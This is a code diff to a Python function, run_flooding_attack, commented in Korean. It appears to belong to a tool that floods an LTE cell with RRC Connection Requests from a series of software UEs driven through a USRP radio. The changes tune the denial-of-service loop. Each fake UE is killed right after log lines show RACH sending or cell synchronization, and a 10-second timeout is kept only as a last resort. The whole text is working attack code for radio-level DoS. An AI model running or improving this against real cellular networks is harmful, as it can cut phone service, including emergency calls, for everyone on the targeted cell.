@@ -143,7 +143,7 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
     current_process = None
     process_start_time = None
     current_log_file = None
-    max_process_wait_time = 2.0  # 각 프로세스당 최대 2초 대기 (RRC Request만 보내고 종료)
+    max_process_wait_time = 10.0  # 최후의 수단: 프로세스가 멈춰있을 때만 사용 (기본적으로 로그 기반으로 종료)
     
     try:
         loop_count = 0
@@ -195,24 +195,8 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                     ue_id += 1
                     continue
             
-            # 타임아웃 확인
-            if current_process and process_start_time:
-                elapsed = time.time() - process_start_time
-                if elapsed > max_process_wait_time:
-                    # 타임아웃: 다음 config로 이동
-                    logger.info(f"UE 타임아웃 (경과: {elapsed:.2f}초) → 다음 UE로 이동")
-                    if current_process.poll() is None:
-                        current_process.terminate()
-                        try:
-                            current_process.wait(timeout=0.5)
-                        except:
-                            current_process.kill()
-                    current_process = None
-                    process_start_time = None
-                    current_log_file = None
-                    continue
-            
             # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
+            # 로그 기반으로 즉시 종료하므로 타임아웃은 최후의 수단으로만 사용
             if current_process:
                 # 프로세스가 종료되었는지 먼저 확인
                 poll_result = current_process.poll()
@@ -256,6 +240,16 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             'sending rach'
                         ])
                         
+                        # 셀 동기화 또는 attach 시도 확인 (더 빠른 종료를 위해)
+                        cell_synced = any(keyword in log_content.lower() for keyword in [
+                            'synchronized to cell',
+                            'cell synchronized',
+                            'attaching ue',
+                            'attach request',
+                            'found cell',
+                            'cell found'
+                        ])
+                        
                         # PBCH 디코딩 실패 확인
                         pbch_failed = 'could not decode pbch' in log_content.lower()
                         elapsed = time.time() - process_start_time if process_start_time else 0
@@ -275,6 +269,18 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             continue
                         elif rach_sent and elapsed > 0.5:
                             # RACH 전송 후 0.5초 지났으면 다음으로 (RRC Request가 곧 올 것)
+                            if current_process.poll() is None:
+                                current_process.terminate()
+                                try:
+                                    current_process.wait(timeout=0.3)
+                                except:
+                                    current_process.kill()
+                            current_process = None
+                            process_start_time = None
+                            current_log_file = None
+                            continue
+                        elif cell_synced and elapsed > 0.8:
+                            # 셀 동기화 후 0.8초 지났으면 다음으로 (RRC Request가 곧 올 것)
                             if current_process.poll() is None:
                                 current_process.terminate()
                                 try:
@@ -311,6 +317,23 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         continue
                     elif elapsed > 1.0 and int(elapsed) % 2 == 0:  # 2초마다 한 번씩 로그
                         logger.info(f"로그 파일 대기 중: {current_log_file} (경과: {elapsed:.1f}초, 프로세스 실행 중)")
+            
+            # 최후의 수단: 타임아웃 체크 (로그 기반 종료가 실패했을 때만)
+            if current_process and process_start_time:
+                elapsed = time.time() - process_start_time
+                if elapsed > max_process_wait_time:
+                    # 타임아웃: 다음 UE로 이동 (로그에서 종료 조건을 찾지 못한 경우)
+                    logger.warning(f"UE 타임아웃 (경과: {elapsed:.2f}초, 로그 기반 종료 실패) → 다음 UE로 이동")
+                    if current_process.poll() is None:
+                        current_process.terminate()
+                        try:
+                            current_process.wait(timeout=0.5)
+                        except:
+                            current_process.kill()
+                    current_process = None
+                    process_start_time = None
+                    current_log_file = None
+                    continue
             
             # 짧은 대기 후 다시 확인
             
